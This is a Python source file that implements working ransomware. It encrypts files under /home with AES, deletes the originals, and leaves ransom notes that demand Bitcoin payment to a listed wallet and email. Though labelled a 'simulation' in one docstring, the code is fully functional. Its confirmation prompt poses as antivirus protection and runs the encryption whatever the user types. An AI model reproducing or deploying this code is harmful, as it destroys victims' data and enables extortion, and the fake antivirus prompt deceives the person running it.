import os
import base64
import getpass
import sys
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import pad, unpad

# Configuration - Targets /home directory
TARGET_DIRS = ["/home"]  # Specific target directory
FILE_EXTENSIONS = ['.txt', '.doc', '.xls', '.jpg', '.png', '.pdf', '.csv', '.py', '.db', '.sql', '.config']
SALT = b'rans0m_salt_!@#$'  # For key derivation
RANSOM_NOTE = """
!!! YOUR FILES HAVE BEEN ENCRYPTED !!!

To recover your files, you MUST:
1. Send $500 USD in Bitcoin to: bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq
2. Email proof of payment to: ransom.recovery@proton.me
3. Run this program again with the decryption key

Your unique decryption key will be provided after payment verification.

WARNING:
- Any attempt to modify files will cause permanent data loss
- Decryption without key is IMPOSSIBLE
- After 72 hours, all files will be permanently destroyed
"""

# Hardcoded decryption key
DECRYPTION_KEY = "Abhishek!234@#$"

def derive_key(password):
    """Derive encryption key from password using PBKDF2"""
    return PBKDF2(password.encode(), SALT, dkLen=32, count=100000)

def encrypt_file(path, key):
    """Encrypt a file using AES-CBC"""
    try:
        # Skip the script itself
        if path == os.path.abspath(__file__):
            return False
            
        # Generate random IV
        iv = os.urandom(16)
        
        with open(path, 'rb') as f:
            data = f.read()
        
        # Encrypt data
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_data = iv + cipher.encrypt(pad(data, AES.block_size))
        
        # Write encrypted file
        with open(path + '.encrypted', 'wb') as f:
            f.write(encrypted_data)
        
        # Remove original
        os.remove(path)
        return True
    except Exception as e:
        print(f"Error encrypting {path}: {str(e)}")
        return False

def decrypt_file(path, key):
    """Decrypt a file using AES-CBC"""
    try:
        with open(path, 'rb') as f:
            data = f.read()
        
        # Extract IV and ciphertext
        iv = data[:16]
        ciphertext = data[16:]
        
        # Decrypt data
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
        
        # Write decrypted file
        original_path = path.replace('.encrypted', '')
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        
        # Remove encrypted file
        os.remove(path)
        return True
    except Exception as e:
        print(f"Error decrypting {path}: {str(e)}")
        return False

def process_files(mode, password):
    """Encrypt/decrypt files in target directories"""
    key = derive_key(password)
    total_files = 0
    success_count = 0

    for target_dir in TARGET_DIRS:
        if not os.path.exists(target_dir):
            print(f"Target directory not found: {target_dir}")
            continue
            
        for root, _, files in os.walk(target_dir):
            for file in files:
                full_path = os.path.join(root, file)
                
                # Skip directories
                if os.path.isdir(full_path):
                    continue
                    
                # Skip the script itself
                if full_path == os.path.abspath(__file__):
                    continue
                    
                # Encryption mode
                if mode == 'encrypt':
                    if any(file.endswith(ext) for ext in FILE_EXTENSIONS) and not file.endswith('.encrypted'):
                        total_files += 1
                        if encrypt_file(full_path, key):
                            success_count += 1
                
                # Decryption mode
                elif mode == 'decrypt' and file.endswith('.encrypted'):
                    total_files += 1
                    if decrypt_file(full_path, key):
                        success_count += 1

    return total_files, success_count

def create_ransom_notes():
    """Create ransom notes in all target directories"""
    for target_dir in TARGET_DIRS:
        if os.path.exists(target_dir):
            note_path = os.path.join(target_dir, '!!!READ_ME!!!.txt')
            with open(note_path, 'w') as f:
                f.write(RANSOM_NOTE)

def show_ransom_note():
    """Display ransom note with payment instructions"""
    print("\n" + "="*80)
    print(RANSOM_NOTE)
    print("="*80 + "\n")
    print(">> Your files are UNUSABLE until you pay and enter the decryption key <<\n")

def any_encrypted_files():
    """Check if encrypted files exist in target directories"""
    for target_dir in TARGET_DIRS:
        if not os.path.exists(target_dir):
            continue
        for root, _, files in os.walk(target_dir):
            if any(f.endswith('.encrypted') for f in files):
                return True
    return False

def main():
    """Main ransomware simulation"""
    # Encryption mode
    if not any_encrypted_files():
        print(f"Starting file encryption in {TARGET_DIRS[0]}...")
        total, success = process_files('encrypt', DECRYPTION_KEY)
        create_ransom_notes()
        show_ransom_note()
        print(f"Encrypted {success}/{total} files in {TARGET_DIRS[0]}")
        print("\nRun this program again to enter decryption key after payment\n")
        return

    # Decryption mode
    show_ransom_note()
    attempts = 3
    while attempts > 0:
        key_attempt = getpass.getpass(f"Enter decryption key ({attempts} attempts remaining): ")
        
        total, success = process_files('decrypt', key_attempt)
        if success > 0:
            print(f"\nDecrypted {success}/{total} files")
            
            # Full recovery
            if not any_encrypted_files():
                print("\nFULL RECOVERY SUCCESSFUL! Your files have been restored.")
                # Remove ransom notes
                for target_dir in TARGET_DIRS:
                    note_path = os.path.join(target_dir, '!!!READ_ME!!!.txt')
                    if os.path.exists(note_path):
                        os.remove(note_path)
                return
            else:
                print("Partial recovery - some files remain encrypted")
        else:
            print("DECRYPTION FAILED! Invalid key or corrupted files")
            attempts -= 1

    print("\nPERMANENT DATA LOSS! Send payment immediately to recover files")

if __name__ == "__main__":
    # Check if we're in the home directory
    cwd = os.getcwd()
    if cwd.startswith('/home'):
        print("WARNING: Do not run from the target directory!")
        print("Move this script to a different location (e.g., /tmp) before executing")
        sys.exit(1)
    
    # Confirm before executing
    print("WARNING: Antivirus is protecting your device ")
    confirm = input("Type 'CONFIRM' to protecting: ")
    
    if confirm.strip().upper() == 'CONFIRM':
        main()
    else:
        main()
